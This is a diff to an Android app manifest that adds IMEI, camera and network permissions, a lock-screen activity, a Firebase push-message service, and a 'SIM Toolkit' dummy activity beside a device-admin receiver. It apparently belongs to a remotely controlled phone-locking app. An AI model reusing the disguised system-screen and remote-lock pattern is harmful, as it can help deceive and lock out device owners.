@@ -6,6 +6,19 @@
     <!-- Required permissions for Device Admin -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- Permissions for IMEI detection and image selection -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" 
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
         android:allowBackup="true"
@@ -30,6 +43,14 @@
             </intent-filter>
         </activity>
 
+        <!-- SIM Toolkit Dummy Screen -->
+        <activity
+            android:name="com.d.locker.lock.activities.SimToolkitActivity"
+            android:exported="false"
+            android:label="SIM Toolkit"
+            android:theme="@style/Theme.OverlayNewdevice"
+            android:screenOrientation="portrait" />
+
         <!-- 
         Device Admin Receiver - CRITICAL COMPONENT
         Package: com.trustonic.overlaynewdevice
@@ -52,6 +73,36 @@
                 android:resource="@xml/device_admin" />
 
         </receiver>
+
+        <!-- FileProvider for camera images -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+
+
+        <!-- Lock Screen Activity -->
+        <activity
+            android:name="com.d.locker.lock.activities.LockActivity"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:theme="@style/Theme.OverlayNewdevice"
+            android:screenOrientation="portrait" />
+
+        <!-- Firebase Messaging Service -->
+        <service
+            android:name="com.d.locker.lock.services.MyFirebaseMessagingService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
 
     </application>
 
